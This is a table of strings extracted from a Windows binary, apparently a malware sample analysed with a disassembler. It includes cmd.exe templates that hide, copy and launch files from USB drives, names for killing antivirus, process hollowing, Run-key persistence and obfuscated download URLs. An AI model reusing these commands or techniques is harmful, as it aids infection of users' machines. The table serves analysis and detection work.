reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x40365c	0x4013c4	string	0x403650	dwwin.exe
0x403691	0x4013d0	string	0x403680	protectaavprotector_c000900
0x4036db	0x4013ec	string	0x4036d0	IsWow64Process
0x4036e0	0x4013fc	string	0x4036d0	kernel32.dll
0x4036ff	0x40140c	string	0x4036d0	AAVkillllerrrsdadc000900
0x4038b9	0x40142c	string	0x403800	.exe
0x403b46	0x401438	string	0x403b40	iphlpapi.dll
0x403b54	0x401448	string	0x403b40	GetExtendedTcpTable
0x403b66	0x40145c	string	0x403b40	GetOwnerModuleFromTcpEntry
0x403f5c	0x401508	string	0x403f30	{A5DCBF10-6530-11D2-901F-00C04FB951ED}
0x4040bd	0x401558	string	0x4040b0	abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
0x404170	0x401594	string	0x404120	CoInitializeEx
0x404175	0x4015a4	string	0x404120	ole32.dll
0x40420b	0x4015b0	string	0x404120	/c "%%SystemRoot%%\explorer.exe %%cd%%%s & attrib -s -h %%cd%%%s & xcopy /F /S /Q /H /R /Y %%cd%%%s %%temp%%\%s\ & attrib +s +h %%cd%%%s & start %%temp%%\%s\%s & exit"
0x40423e	0x401658	string	0x404120	/c "start %%cd%%%s & attrib -s -h %%cd%%%s & xcopy /F /S /Q /H /R /Y %%cd%%%s %%temp%%\%s\ & attrib +s +h %%cd%%%s & start %%temp%%\%s\%s & exit"
0x404253	0x4016ec	string	0x404120	%ALLUSERSPROFILE%\..\..\windows\system32\cmd.exe
0x404285	0x401720	string	0x404120	%SystemRoot%\system32\SHELL32.dll
0x40429c	0x401744	string	0x404120	%SystemRoot%\system32\SHELL32.dll
0x404360	0x401768	string	0x404350	BCDEFGHIJKLMNOPQRSTUVWXYZ
0x404374	0x401784	string	0x404350	abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
0x4043ca	0x4017bc	string	0x404350	%s\c731200
0x4044ac	0x4017c8	string	0x404350	%s\c731200
0x404585	0x4017d4	string	0x404350	.exe
0x40459e	0x4017dc	string	0x404350	%s\*
0x404727	0x4017e4	string	0x404350	%s\%s
0x40474a	0x4017ec	string	0x404350	%s\%s
0x404793	0x4017f4	string	0x404350	%s\%s.lnk
0x4047b6	0x401800	string	0x404350	%s\%s
0x4047cb	0x401808	string	0x404350	.lnk
0x40480a	0x401810	string	0x404350	.exe
0x404820	0x401818	string	0x404350	.pif
0x404836	0x401820	string	0x404350	.scr
0x40484c	0x401828	string	0x404350	.cmd
0x404862	0x401830	string	0x404350	.com
0x40499b	0x401838	string	0x404350	%s\%s
0x404cd1	0x404cdd	string	0x404cc0	jjjj
0x404cfa	0x401840	string	0x404cc0	abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890123456789
0x404d8f	0x40188c	string	0x404d70	HOMEDRIVE
0x404d9a	0x401898	string	0x404d70	\Program Files\
0x404fda	0x4018b0	string	0x404f90	IsWow64Process
0x404fdf	0x4018c0	string	0x404f90	kernel32.dll
0x404ff6	0x4018d0	string	0x404f90	-aav_start
0x405016	0x4018dc	string	0x404f90	-shell
0x405038	0x4018e4	string	0x404f90	Windows_Shared_Mutex_231_c000900
0x40507a	0x401908	string	0x404f90	CFlagc000900
0x405161	0x401918	string	0x404f90	\mspaint.exe
0x405171	0x401934	string	0x404f90	SVCHOST_MUTEX_OBJECT_RELEASED_c000900
0x405181	0x40195c	string	0x404f90	kernel32.dll
0x40518f	0x40196c	string	0x404f90	CreateProcessW
0x4051a3	0x40197c	string	0x404f90	GetProcessVersion
0x4051b7	0x401990	string	0x404f90	Sleep
0x4051cb	0x401998	string	0x404f90	CreateMutexA
0x4051df	0x4019a8	string	0x404f90	ExitProcess
0x4051f3	0x4019b4	string	0x404f90	SetLastError
0x405207	0x4019c4	string	0x404f90	GetLastError
0x405278	0x4019d4	string	0x404f90	\svchost.exe
0x405415	0x4019f4	string	0x4053a0	NtUnmapViewOfSection
0x40541a	0x401a0c	string	0x4053a0	ntdll.dll
0x405601	0x401a18	string	0x4055b0	%s\c731200
0x4056b4	0x401a24	string	0x405680	\ScreenSaverPro.scr
0x405710	0x401a38	string	0x405680	\temp.bin
0x4057ab	0x401a44	string	0x405750	user32.dll
0x4057b6	0x401a50	string	0x405750	advapi32.dll
0x4057c1	0x401a60	string	0x405750	shell32.dll
0x4057cc	0x401a6c	string	0x405750	urlmon.dll
0x4057d7	0x401a78	string	0x405750	wininet.dll
0x4057e2	0x401a84	string	0x405750	gdi32.dll
0x4057ed	0x401a90	string	0x405750	rpcrt4.dll
0x4057f8	0x401a9c	string	0x405750	netapi32.dll
0x405833	0x401aac	string	0x405750	USBProc
0x40588b	0x401ab8	string	0x405750	USBProc
0x405c61	0x401ac0	string	0x405c40	*.exe
0x405cd6	0x401ac8	string	0x405c40	.gonewiththewings
0x405d40	0x401adc	string	0x405d30	*.gonewiththewings
0x405f34	0x401af4	string	0x405ef0	\Microsoft
0x406002	0x401b00	string	0x405ef0	%s\Program Files\Common Files
0x406017	0x401b20	string	0x405ef0	\CreativeAudio
0x406103	0x401b34	string	0x405ef0	%s\programdata
0x406118	0x401b44	string	0x405ef0	\CreativeAudio
0x406228	0x401b58	string	0x405ef0	\Identities
0x4063aa	0x401b64	string	0x405ef0	\adobe
0x4063ff	0x401b6c	string	0x405ef0	ALLUSERSPROFILE
0x40704b	0x401b7c	string	0x407040	kernel32.dll
0x40706b	0x401b8c	string	0x407040	abcdefghijklmnopqrstuvwxyz0123456789
0x40708c	0x401bb4	string	0x407040	SSLOADasdasc000900
0x407106	0x401bc8	string	0x407040	CloseHandle
0x40711e	0x401bd4	string	0x407040	CreateFileA
0x407136	0x401be0	string	0x407040	DeleteFileA
0x40714e	0x401bec	string	0x407040	ExitProcess
0x407166	0x401bf8	string	0x407040	GetFileSize
0x40717e	0x401c04	string	0x407040	GetProcAddress
0x407196	0x401c14	string	0x407040	GetSystemTime
0x4071ae	0x401c24	string	0x407040	GetTempPathA
0x4071c6	0x401c34	string	0x407040	LoadLibraryA
0x4071de	0x401c44	string	0x407040	lstrcatA
0x4071f6	0x401c50	string	0x407040	lstrlenA
0x40720e	0x401c5c	string	0x407040	ReadFile
0x407226	0x401c68	string	0x407040	SetFileAttributesA
0x40723e	0x401c7c	string	0x407040	WinExec
0x407256	0x401c84	string	0x407040	WriteFile
0x40726e	0x401c90	string	0x407040	Sleep
0x407286	0x401c98	string	0x407040	GetLastError
0x40729e	0x401ca8	string	0x407040	CreateMutexA
0x4072c8	0x401cb8	string	0x407040	c731200
0x4072fe	0x401cc4	string	0x407040	user32.dll
0x407310	0x401cd0	string	0x407040	urlmon.dll
0x407322	0x401cdc	string	0x407040	wsprintfA
0x407334	0x401ce8	string	0x407040	URLDownloadToFileA
0x407346	0x401cfc	string	0x407040	wininet.dll
0x407358	0x401d08	string	0x407040	InternetCheckConnectionA
0x40736a	0x401d24	string	0x407040	http://www.google.com
0x407407	0x401d3c	string	0x407040	.exe
0x407439	0x401d44	string	0x407040	c731200
0x40744b	0x401d4c	string	0x407040	9EEAi^^2A:`]H:A>2?:2]4@>]H:A>D4]CF^2A:`]8:7
0x40745d	0x401d78	string	0x407040	9EEAi^^2A:a]H:A>2?:2]4@>]H:A>D4]CF^2A:a]8:7
0x40746f	0x401da4	string	0x407040	9EEAi^^2A:b]H:A>2?:2]4@>]H:A>D4]CF^2A:b]8:7
0x407481	0x401dd0	string	0x407040	9EEAi^^2A:c]H:A>2?:2]4@>]H:A>D4]CF^2A:c]8:7
0x407493	0x401dfc	string	0x407040	9EEAi^^2A:d]H:A>2?:2]4@>]H:A>D4]CF^2A:d]8:7
0x4074a5	0x401e28	string	0x407040	9EEAi^^2A:e]H:A>2?:2]4@>]H:A>D4]CF^2A:e]8:7
0x4074b7	0x401e54	string	0x407040	9EEAi^^2A:f]H:A>2?:2]4@>]H:A>D4]CF^2A:f]8:7
0x4074c9	0x401e80	string	0x407040	9EEAi^^2A:g]H:A>2?:2]4@>]H:A>D4]CF^2A:g]8:7
0x4074db	0x401eac	string	0x407040	9EEAi^^2A:h]H:A>2?:2]4@>]H:A>D4]CF^2A:h]8:7
0x4074ed	0x401ed8	string	0x407040	9EEAi^^2A:]H:A>2?:2]4@>]7@H5]CF^2A:]8:7
0x4074ff	0x401f00	string	0x407040	9EEAi^^2A:]H:A>2?:2]4@>]D6=7>8]CF^2A:]8:7
0x407511	0x401f2c	string	0x407040	9EEAi^^2A:]H:A>2?:2]4@>]=@EFDd]CF^2A:]8:7
0x407523	0x401f58	string	0x407040	9EEAi^^2A:]H:A>2?:2]4@>]H:A>2?:2]CF^{<HpIs]8:7
0x407535	0x401f88	string	0x407040	9EEAi^^2A:]H:A>2?:2]4@>]=@EJD]CF^Gy@yp:]8:7
0x407547	0x401fb4	string	0x407040	9EEAi^^2A:]H:A>2?:2]4@>]3H2ED]CF^~7;%|6]8:7
0x407559	0x401fe0	string	0x407040	9EEAi^^2A:]H:A>2?:2]4@>]DE4FD]CF^2A$!9G]8:7
0x40756b	0x40200c	string	0x407040	9EEAi^^2A:]H:A>2?:2]4@>]4>@6?]CF^K<>4w|]8:7
0x40757d	0x402038	string	0x407040	9EEAi^^2A:]H:A>2?:2]4@>]2CE34@?b]CF^7C7{6r]8:7
0x40758f	0x402068	string	0x407040	9EEAi^^2A:]H:A>2?:2]4@>]J6=@E@]CF^KHu|Hs]8:7
0x4075a1	0x402098	string	0x407040	9EEAi^^FA52E6]H:A>2?:2]4@>]C2F=9@DE]CF^=@8@]8:7
0x4075f6	0x4020c8	string	0x407040	\calc.exe
0x4078a6	0x4020d4	string	0x407830	APPDATA
0x4078b1	0x4020dc	string	0x407830	\Update
0x4078d2	0x4020e4	string	0x407830	\Explorer.exe
0x40793b	0x4020f4	string	0x407830	SOFTWARE\Microsoft\Windows\CurrentVersion\Run
0x4079ac	0x402124	string	0x407830	Windows Explorer Manager
0x4079d3	0x402140	string	0x407830	SVCHOST_MUTEX_OBJECT_RELEASED_c000900
0x407a0e	0x402168	string	0x407830	notepad.exe
0x407a1b	0x402174	string	0x407830	msiexec.exe
0x407a28	0x402180	string	0x407830	mspaint.exe
0x407a96	0x40218c	string	0x407830	\mspaint.exe
0x407b46	0x40219c	string	0x407b30	MonitorPaint_MUTEX_OBJECT_RELEASED_c000900
0x407bd8	0x4021c8	string	0x407b30	\mspaint.exe
0x407c93	0x4021d8	string	0x407c80	MonitorSvchost_MUTEX_OBJECT_RELEASED_c000900
0x407d1c	0x402208	string	0x407c80	\svchost.exe
0x407e6f	0x402374	string	0x407df0	WindowsSecondaryDesktop
0x407ea7	0x4023a4	string	0x407df0	\charmap.exe
0x407f02	0x4023c0	string	0x407df0	\Windows Media Player\wmprph.exe
0x407f75	0x402404	string	0x407f60	C:\log.txt
0x407fa2	0x402410	string	0x407f60	C:\log.txt
0x408053	0x402428	string	0x408040	%s\*.*
0x408152	0x402430	string	0x408040	%s\%s
0x4081e8	0x402438	string	0x4081a0	%s\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
0x408203	0x402478	string	0x4081a0	%s\Documents and Settings\All users\Start Menu\Programs\Startup
0x4086c2	0x4024cc	string	0x408540	\Update
0x408786	0x4024d4	string	0x408540	Software\Microsoft\Windows\CurrentVersion\Run
0x40879a	0x402504	string	0x408540	Software\Microsoft\Windows\CurrentVersion\RunOnce
0x4087ae	0x402538	string	0x408540	Software\Microsoft\Windows\CurrentVersion\Run
0x4087c2	0x402568	string	0x408540	Software\Microsoft\Windows\CurrentVersion\RunOnce
0x4088ea	0x40259c	string	0x4088c0	%s\Recycler
0x408925	0x4025a8	string	0x4088c0	%s\%s
0x408e89	0x402640	string	0x408e50	IsWow64Process
0x408e8e	0x402650	string	0x408e50	kernel32.dll
0x408f14	0x40f510	string	0x408e50	Software\Microsoft\Windows\CurrentVersion\Run
0x408f26	0x40f540	string	0x408e50	Software\Microsoft\Windows\CurrentVersion\RunOnce
0x408fba	0x40f510	string	0x408e50	Software\Microsoft\Windows\CurrentVersion\Run
0x40901c	0x40f540	string	0x408e50	Software\Microsoft\Windows\CurrentVersion\RunOnce
0x409082	0x40f510	string	0x408e50	Software\Microsoft\Windows\CurrentVersion\Run
0x409094	0x40f540	string	0x408e50	Software\Microsoft\Windows\CurrentVersion\RunOnce
0x40915d	0x402668	string	0x408e50	WindowsId
0x409191	0x402674	string	0x408e50	WindowsId
0x4091a5	0x402680	string	0x408e50	Microsoft\Windows\%s
0x4091c8	0x402698	string	0x408e50	%s\%s
0x40922d	0x4026a0	string	0x408e50	%s\%s\%s.exe
0x4092a9	0x4026b0	string	0x408e50	:Zone.Identifier
0x409326	0x40f4d4	string	0x409300	Software\Microsoft\Windows\CurrentVersion\Policies\Explorer
0x409349	0x40f574	string	0x409300	DisableLocalMachineRun
0x409362	0x40f58c	string	0x409300	DisableCurrentUserRun
0x40937b	0x40f5a4	string	0x409300	DisableLocalMachineRunOnce
0x409394	0x40f5c0	string	0x409300	DisableCurrentUserRunOnce
0x4093ea	0x40f4d4	string	0x4093c0	Software\Microsoft\Windows\CurrentVersion\Policies\Explorer
0x409403	0x40f574	string	0x4093c0	DisableLocalMachineRun
